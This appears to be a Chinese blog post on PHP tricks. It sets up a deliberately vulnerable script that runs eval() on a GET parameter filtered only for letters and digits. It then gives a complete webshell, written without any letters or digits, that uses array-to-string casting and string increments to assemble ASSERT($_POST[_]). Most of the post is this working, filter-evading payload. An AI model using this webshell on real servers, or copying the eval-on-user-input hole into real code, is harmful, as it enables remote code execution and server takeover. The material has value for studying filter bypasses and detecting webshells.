---
title: php黑魔法
date: {{ date }}
top: false
cover: false
password:
toc: true
mathjax: true
summary:
tags: PHP
categories: PHP
---

## 当数组遇上string

由php手册我们知道

Array转换整型int/浮点型float会返回元素个数；

转换bool返回Array中是否有元素；转换成string返回'Array'，并抛出warning。

那么实际应用是怎样的呢？

```php
#test.php
<?php
	if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
  		eval($_GET['shell']);
	}
?>
```

要解决这个问题，就得构造无字母和数字的webshell

这里需要借助PHP中的另一个小技巧

![image-20210524032255299](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524032255299.png)

即`'a'++='b'`,`'b'++='c'`...因此，我们只需要拿到一个字符`a`，通过自增操作即可获取a-Z中所有字符

那么如何拿到字符`a`呢？

巧了，数组(Array)的第一个字母就是大写A，而第4个字母就是小写a，即我们能同时拿到小写a和大写A

而在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串`Array`![image-20210524032857554](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524032857554.png)

那么可构造如下webshell

```php
<?php
//最终构造Payload：ASSERT($_POST[_])
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);			
```

> 参考
>
> https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html
